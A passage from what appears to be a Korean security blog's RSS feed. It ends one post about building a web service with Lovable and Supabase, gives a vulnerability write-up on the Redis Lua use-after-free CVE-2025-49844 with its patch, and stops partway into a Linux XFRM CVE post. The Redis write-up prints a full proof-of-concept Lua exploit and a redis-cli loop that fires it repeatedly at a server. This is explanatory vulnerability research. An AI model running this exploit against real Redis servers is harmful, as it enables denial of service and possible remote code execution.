&#xC4F8;&#xAE4C; &#xCC3E;&#xC544;&#xBCF4;&#xB358; &#xC911; &#x201C;Lovable&#xC774;&#xB77C;&#xB294; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC694;&#xC998; &#xD56B;&#xD558;&#xB2E4;&#xB354;&#xB77C;&#x201D;&#xB294; &#xC598;&#xAE30;&#xB97C; &#xB4E3;&#xACE0; &#xC77C;&#xB2E8; &#xC368;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC804;&#xC5D0; &#xAC1C;&#xBC1C;&#xD588;&#xB358; &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB611;&#xAC19;&#xC774; &#xBA3C;&#xC800; &#xBC30;&#xAEF4;&#xC628; &#xB4A4; &#xB85C;&#xADF8;&#xC778;&#xBD80;&#xD130; &#xAC1C;&#xBC1C;&#xD558;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA3C;&#xC800; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; Supabase&#xB97C; &#xC5F0;&#xACB0;&#xC2DC;&#xCF30;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/05.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.29.09.png"></p><p>Base44&#xC640; &#xB2EC;&#xB9AC; Supabase&#xB791; &#xBC14;&#xB85C; &#xC5F0;&#xB3D9;&#xB3C4; &#xB418;&#xACE0;, &#xB514;&#xBE44; &#xAD00;&#xB9AC;&#xD558;&#xAE30;&#xB3C4; &#xD3B8;&#xD558;&#xACE0; &#xC5EC;&#xB7EC;&#xBAA8;&#xB85C; &#xC7A5;&#xC810;&#xC774; &#xC788;&#xB294; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xB300;&#xADDC;&#xBAA8; &#xACE0;&#xAC1D;&#xC744; &#xAC10;&#xB2F9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xD798;&#xB4E4;&#xAE34;&#xD558;&#xACA0;&#xC9C0;&#xB9CC;&#xC694;(&#xC81C; &#xC9C0;&#xAC11;&#xC774;) &#xC774;&#xB807;&#xAC8C; &#xC5F0;&#xB3D9;&#xC744; &#xD558;&#xACE0; &#xB85C;&#xADF8;&#xC778; &#xBC84;&#xD2BC;&#xC744; &#xB9CC;&#xB4E4;&#xBA74;&#x2026;</p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/06.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.36.58.png"></p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/07.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.37.39.png"></p><p>&#xB124;&#x2026; &#xBB50; &#xC27D;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC; &#xBA87; &#xBC88;&#xC758; &#xD2B8;&#xB77C;&#xC774;&#xB9CC;&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xAE34;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB85C;&#xADF8;&#xC778;&#xD55C; &#xB4A4;&#xC5D0;&#xB294; &#xB300;&#xC2DC;&#xBCF4;&#xB4DC;&#xAC00; &#xC788;&#xC5B4;&#xC57C;&#xACA0;&#xC8E0;? &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC798; &#xC791;&#xC131;&#xD574;&#xC11C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/08.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 5.43.31.png"></p><p>&#xB2F9;&#xC5F0;&#xD788; &#xC704; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xD55C;&#xBC88;&#xC73C;&#xB85C; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xAC1C;&#xBC1C;&#xB418;&#xC9C0;&#xB294; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xD55C;&#xBC88;&#xC5D0; &#xB410;&#xB2E4;&#xBA74; &#xBC14;&#xB85C; Lovable &#xC8FC;&#xC2DD;&#xC744; &#xAD6C;&#xD558;&#xB7EC; &#xB2E4;&#xB154;&#xC744; &#xAC81;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xBB34;&#xD2BC; &#xC5EC;&#xC804;&#xD788; &#xBB38;&#xC81C;&#xB294; &#xB9CE;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. API &#xD0A4;&#xB97C; &#xB79C;&#xB364;&#xD558;&#xAC8C;&#xB294; &#xC798; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC; Supabase&#xC5D0; &#xC800;&#xC7A5;&#xD560; &#xB54C; API &#xD0A4; &#xC77C;&#xBD80;&#xB97C; &#xB9C8;&#xC2A4;&#xD0B9;(<em>*</em>) &#xCC98;&#xB9AC;&#xD55C; &#xC0C1;&#xD0DC;&#xB85C; &#xADF8;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xB358;&#xAC00;, &#xC784;&#xC758;&#xB85C; &#xBC84;&#xD2BC;&#xC744; &#xC5C6;&#xC564;&#xB2E4;&#xB358;&#xAC00; &#xB4F1;&#xB4F1; &#xC790;&#xC798;&#xD558;&#xAC8C; &#xC2E0;&#xACBD;&#xC368;&#xC57C;&#xD560; &#xAC83;&#xB4E4;&#xC774; &#xC880; &#xC788;&#xC5C8;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; &#xAD6C;&#xD604;&#xD560; &#xAE30;&#xB2A5;&#xB4E4;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xC880; &#xB354; &#xC904;&#xC774;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798;&#xB294; &#xC8FC;&#xAC04; &#xC0AC;&#xC6A9;&#xB7C9; Top 5 &#xC774;&#xB7F0; &#xC7AC;&#xBBF8;&#xC694;&#xC18C;&#xB3C4; &#xB123;&#xC73C;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;&#x2026; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xD504;&#xB86C;&#xD504;&#xD305;&#xC744; &#xB9CE;&#xC774; &#xD574;&#xC57C;&#xD574;&#xC11C; &#xC77C;&#xB2E8;&#xC740; &#xB118;&#xC5B4;&#xAC00;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2025/10/30/j0ker/service_dev_part1/kr/09.png" alt="&#x1109;&#x1173;&#x110F;&#x1173;&#x1105;&#x1175;&#x11AB;&#x1109;&#x1163;&#x11BA; 2025-10-29 &#x110B;&#x1169;&#x1112;&#x116E; 6.55.28.png"></p><p>&#xADF8;&#xB798;&#xB3C4; 4&#xC2DC;&#xAC04; &#xC815;&#xB3C4; &#xC0BD;&#xC9C8;&#xD55C; &#xB05D;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC81C; &#xBBF8;&#xCC9C;&#xD55C; &#xC6F9; &#xAC1C;&#xBC1C; &#xC2E4;&#xB825;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xAC1C;&#xBC1C;&#xD588;&#xB2E4;&#xBA74; 1&#xC8FC;&#xC77C;&#xC740; &#xAC78;&#xB838;&#xC744;&#xD150;&#xB370; &#xD655;&#xC2E4;&#xD788; &#xC694;&#xC998; AI &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xAC8C; &#xD6E8;&#xC52C; &#xC774;&#xB4DD;&#xC778;&#xAC70; &#xAC19;&#xB124;&#xC694;.</p><p>&#xC624;&#xB298;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC774;&#xC815;&#xB3C4;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB098;&#xBA38;&#xC9C0; &#xAC1C;&#xBC1C;&#xAE30;&#xC640; &#xBC1C;&#xD45C; &#xD604;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; &#xB610; &#xC5B4;&#xB5A4; &#xC77C;&#xC774; &#xC788;&#xC5C8;&#xB294;&#xC9C0; &#xB2E4;&#xB904;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC;&#x2026; &#xADF8; &#xB54C;&#xAE4C;&#xC9C0; &#xC798; &#xC0B4;&#xC544;&#xC788;&#xB3C4;&#xB85D; &#xBE4C;&#xC5B4;&#xC8FC;&#xC138;&#xC694;&#x2026; &#xBC14;&#xC774;!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ollama/">ollama</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/plugin/">plugin</category>
      
      <category domain="https://hackyboiz.github.io/tags/startup/">startup</category>
      
      <category domain="https://hackyboiz.github.io/tags/develope/">develope</category>
      
      <category domain="https://hackyboiz.github.io/tags/ida/">ida</category>
      
      <category domain="https://hackyboiz.github.io/tags/hacky-ai/">hacky-ai</category>
      
      <category domain="https://hackyboiz.github.io/tags/lovable/">lovable</category>
      
      <category domain="https://hackyboiz.github.io/tags/supabse/">supabse</category>
      
      <category domain="https://hackyboiz.github.io/tags/qwen/">qwen</category>
      
      <category domain="https://hackyboiz.github.io/tags/langfuse/">langfuse</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/30/j0ker/service_dev_part1/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-49844 : Redis의 Lua 스크립트를 통한 Use After Free로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/</link>
      <guid>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/</guid>
      <pubDate>Wed, 29 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dwisiswant0/CVE-2025-49844&quot;&gt;http</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/dwisiswant0/CVE-2025-49844">https://github.com/dwisiswant0/CVE-2025-49844</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Redis server &#x2264; 8.2.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xBE44;&#xC815;&#xD615; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xAD00;&#xB9AC; &#xC2DC;&#xC2A4;&#xD15C; Redis&#xC5D0;&#xC11C; UAF&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>Redis&#xB294; &#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xC744; &#xC704;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; Lua 5.1&#xC744; &#xB0B4;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC77D;&#xC5B4; &#xB4E4;&#xC774;&#xB294; <code>luaY_parser()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>Lua&#xC5D0;&#xC11C;&#xB294; Lua &#xC2A4;&#xD0DD;&#xC744; &#xD1B5;&#xD574; &#xD568;&#xC218; &#xD638;&#xCD9C;, &#xC5F0;&#xC0B0;, &#xC9C0;&#xC5ED; &#xBCC0;&#xC218; &#xC800;&#xC7A5; &#xB4F1; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; &#xC791;&#xC5C5;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; C&#xC758; <code>malloc()</code>, <code>free()</code>&#xCC98;&#xB7FC; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xC2E0; Lua&#xC5D0;&#xC11C;&#xB294; GC(Garbage Collector)&#xB97C; &#xD1B5;&#xD574; &#xB354; &#xC774;&#xC0C1; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xAC1D;&#xCCB4;(&#xBB38;&#xC790;&#xC5F4;, &#xD14C;&#xC774;&#xBE14; &#xB4F1;)&#xB97C; &#xCC3E;&#xC544; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. Lua &#xC2A4;&#xD0DD;&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xAC12;&#xC740; &#xACE0;&#xC815;(Pinning)&#xD558;&#xC5EC; GC&#xC5D0;&#xAC8C; &#xC54C;&#xB824;&#xC8FC;&#xBA74;, GC&#xB294; &#xD574;&#xB2F9; &#xAC12;&#xC744; &#xD574;&#xC81C;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">...luaX_setinput(L, &amp;lexstate, z, luaS_new(L, name));...</code></pre><p>&#xBB38;&#xC81C;&#xB294; <code>luaY_parser()</code>&#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; &#xAC01; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xC5D0; Lua &#xC2A4;&#xD0DD;&#xC5D0; &#xCCAD;&#xD06C; &#xC774;&#xB984; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xACE0;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC704; <code>luaY_parser()</code> &#xB0B4;&#xC5D0;&#xC11C;&#xB294; &#xCCAD;&#xD06C; &#xC774;&#xB984;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC9C0;&#xB9CC;, &#xBCC4;&#xB3C4;&#xC758; &#xCCAD;&#xD06C; &#xACE0;&#xC815;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xB54C;&#xBB38;&#xC5D0;, &#xACE0;&#xC815;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD574;&#xB2F9; &#xCCAD;&#xD06C;&#xB97C; GC&#xB294; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0; &#xD574;&#xC81C; &#xC791;&#xC5C5;&#xC744; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; <code>luaY_parser()</code>&#xAC00; &#xB2E4;&#xC2DC; &#xCC38;&#xC870;&#xD558;&#xACE0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xBA74; UAF &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>luaY_parser</code>&#xAC00; &#xD30C;&#xC2F1;&#xC744; &#xC644;&#xB8CC;&#xD558;&#xAE30; &#xC804;&#xC5D0; GC&#xB97C; &#xB450; &#xBC88; &#xC5F0;&#xC18D;&#xC73C;&#xB85C; &#xAC15;&#xC81C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;, &#xD30C;&#xC11C;&#xAC00; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xCCAD;&#xD06C;&#xB97C; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC81C; &#xC2DC;&#xCF1C; UAF&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua"><span class="hljs-comment">-- CVE-2025-49844 repro: leverage GC during parsing to revive freed chunk name.</span><span class="hljs-comment">-- Keep the chunk large enough to hold onto GC-managed memory but avoid the</span><span class="hljs-comment">-- &quot;200 local variables&quot; compilation guard by filling it with comments.</span><span class="hljs-keyword">local</span> payload = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&apos;-- whatthefuuuuuuuuuuuuuuck\n&apos;</span>, <span class="hljs-number">4096</span>)<span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">build_payload</span><span class="hljs-params">()</span></span><span class="hljs-keyword">local</span> <span class="hljs-built_in">lines</span> = {}<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">150</span> <span class="hljs-keyword">do</span><span class="hljs-built_in">lines</span>[i] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&apos;local v_%d = %d&apos;</span>, i, i)<span class="hljs-keyword">end</span><span class="hljs-built_in">lines</span>[#<span class="hljs-built_in">lines</span> + <span class="hljs-number">1</span>] = <span class="hljs-string">&apos;return 0&apos;</span><span class="hljs-keyword">return</span> <span class="hljs-built_in">table</span>.<span class="hljs-built_in">concat</span>(<span class="hljs-built_in">lines</span>, <span class="hljs-string">&apos;\n&apos;</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_chunk_name</span><span class="hljs-params">()</span></span><span class="hljs-keyword">local</span> p = newproxy(<span class="hljs-literal">true</span>)<span class="hljs-built_in">getmetatable</span>(p).<span class="hljs-built_in">__gc</span> = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span><span class="hljs-comment">-- Re-enter the collector while luaY_parser still holds the name string</span><span class="hljs-built_in">collectgarbage</span>(<span class="hljs-string">&apos;collect&apos;</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">return</span> <span class="hljs-built_in">tostring</span>(p)<span class="hljs-keyword">end</span><span class="hljs-keyword">local</span> source = build_payload()<span class="hljs-keyword">for</span> i = <span class="hljs-number">1</span>, <span class="hljs-number">2000</span> <span class="hljs-keyword">do</span><span class="hljs-keyword">local</span> fn, err = <span class="hljs-built_in">loadstring</span>(source, make_chunk_name())<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> fn <span class="hljs-keyword">then</span><span class="hljs-keyword">return</span> { step = i, err = err }<span class="hljs-keyword">end</span><span class="hljs-keyword">if</span> i % <span class="hljs-number">64</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">then</span><span class="hljs-comment">-- Heap churn to encourage the collector to run during parsing</span><span class="hljs-keyword">local</span> junk = {}<span class="hljs-keyword">for</span> j = <span class="hljs-number">1</span>, <span class="hljs-number">256</span> <span class="hljs-keyword">do</span>junk[j] = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">rep</span>(<span class="hljs-string">&apos;A&apos;</span>, <span class="hljs-number">4096</span>)<span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">end</span><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;completed w/o immediate crash (sybau &amp; re-run to increase likelihood)&quot;</span></code></pre><p>&#xD574;&#xB2F9; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; redis-cli&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xC11C;&#xBC84; &#xC8FC;&#xC18C;&#xB85C; &#xC804;&#xB2EC;&#xD558;&#xBA74; UAF&#xB97C; &#xD1B5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash"><span class="hljs-keyword">while</span> redis-cli -h localhost -p 6379 --<span class="hljs-built_in">eval</span> CVE-2025-49844.lua &gt;/dev/null; <span class="hljs-keyword">do</span>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;.&apos;</span><span class="hljs-keyword">done</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Redis 8.2.2 &#xBC84;&#xC804;&#xC5D0; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0DD;&#xC131;&#xB41C; &#xCCAD;&#xD06C;&#xB97C; <code>setsvalue2s()</code>, <code>incr_top()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC2A4;&#xD0DD;&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC784;&#xC744; &#xC54C;&#xB9AC;&#xBA70; &#xACE0;&#xC815; &#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. GC&#xC5D0; &#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xCCAD;&#xD06C;&#xC784;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xAE30;&#xC5D0; UAF &#xBC1C;&#xC0DD;&#xC744; &#xB9C9;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs lua">TString *tname = luaS_new(L, name);setsvalue2s(L, L-&gt;top, tname);incr_top(L);luaX_setinput(L, &amp;lexstate, z, tname);<span class="hljs-comment">--L-&gt;top;</span></code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49844">https://nvd.nist.gov/vuln/detail/CVE-2025-49844</a></li><li><a href="https://github.com/dwisiswant0/CVE-2025-49844/blob/master/CVE-2025-49844.lua">https://github.com/dwisiswant0/CVE-2025-49844/blob/master/CVE-2025-49844.lua</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Redis/">Redis</category>
      
      <category domain="https://hackyboiz.github.io/tags/redis-server/">redis-server</category>
      
      <category domain="https://hackyboiz.github.io/tags/Use-After-Free/">Use After Free</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/29/newp1ayer48/CVE-2025-49844/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-39965: Linux Kernel XFRM subsystem의 UAF 취약점</title>
      <link>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/</link>
      <guid>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/</guid>
      <pubDate>Sun, 26 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://streypaws.github.io/posts/Dissecting-a-1-Day-Vuln</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://streypaws.github.io/posts/Dissecting-a-1-Day-Vulnerability-in-Linux-XFRM-Subsystem/">https://streypaws.github.io/posts/Dissecting-a-1-Day-Vulnerability-in-Linux-XFRM-Subsystem/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ubuntu: <a href="https://ubuntu.com/security/CVE-2025-39965">https://ubuntu.com/security/CVE-2025-39965</a></li><li>Red Hat: <a href="https://access.redhat.com/security/cve/cve-2025-39965">https://access.redhat.com/security/cve/cve-2025-39965</a></li><li>SUSE: <a href="https://www.suse.com/security/cve/CVE-2025-39965.html">https://www.suse.com/security/cve/CVE-2025-39965.html</a></li><li>Debian: <a href="https://security-tracker.debian.org/tracker/CVE-2025-39965">https://security-tracker.debian.org/tracker/CVE-2025-39965</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB9AC;&#xB205;&#xC2A4; &#xCEE4;&#xB110;&#xC758; IPsec &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xAD6C;&#xD604;&#xD558;&#xB294; XFRM &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; Use-After-Free &#xCDE8;&#xC57D;&#xC810; CVE-2025-39965&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xCD5C;&#xADFC; <a href="https://github.com/torvalds/linux/commit/94f39804d891cffe4ce17737d295f3b195bc7299">94f39804d891cffe4ce17737d295f3b195bc7299</a> &#xCEE4;&#xBC0B;&#xC5D0;&#xC11C; &#xBCC0;&#xACBD;&#xB41C; <code>net/xfrm/xfrm_state.c</code> &#xD30C;&#xC77C;&#xC758; <code>xfrm_alloc_spi</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xACF5;&#xAC04;&#xC73C;&#xB85C;&#xBD80;&#xD130; Netlink &#xBA54;&#xC2DC;&#xC9C0;&#xC778; <code>XFRM_MSG_ALLOCSPI</code>&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xBA70;, SPI&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">xfrm_alloc_spi</span><span class="hljs-params">(struct xfrm_state *x, u32 low, u32 high,</span></span><span class="hljs-function"><span class="hljs-params">   struct netlink_ext_ack *extack)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//... </span><span class="hljs-keyword">for</span> (h = <span class="hljs-number">0</span>; h &lt; range; h++) {    <span class="hljs-comment">// Return value of get_random_u32_inclusive can be 0.</span>    u32 spi = (low == high)? low : get_random_u32_inclusive(low, high);    newspi = htonl(spi);    spin_lock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);    x0 = xfrm_state_lookup_spi_proto(net, newspi, x-&gt;id.proto);    <span class="hljs-keyword">if</span> (!x0) {        x-&gt;id.spi = newspi;        h = xfrm_spi_hash(net, 